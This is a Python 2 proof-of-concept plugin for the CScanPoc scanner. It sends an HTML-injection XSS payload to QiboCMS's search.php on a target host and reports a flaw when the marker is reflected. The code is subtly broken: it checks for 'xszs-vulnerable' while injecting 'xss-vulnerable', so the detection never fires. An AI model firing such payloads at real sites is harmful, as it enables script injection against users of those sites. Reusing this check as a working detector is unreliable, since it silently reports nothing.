# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0016' # 平台漏洞编号，留空
    name = '齐博CMS XSS' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2013-02-03'  # 漏洞公布时间
    desc = '''
        QiboCMS  /search.php?module_db[]=<h1>xss-vulnerable</h1><!-- 跨站脚本攻击漏洞。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/15370/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3afa344f-6655-4173-9d75-9e3c95bd944c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/search.php?module_db[]=<h1>xss-vulnerable</h1><!--"
            url = arg + payload
            code, head, res, errcode, finalurl = hh.http(url)
            if code == 200:
                if 'xszs-vulnerable' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()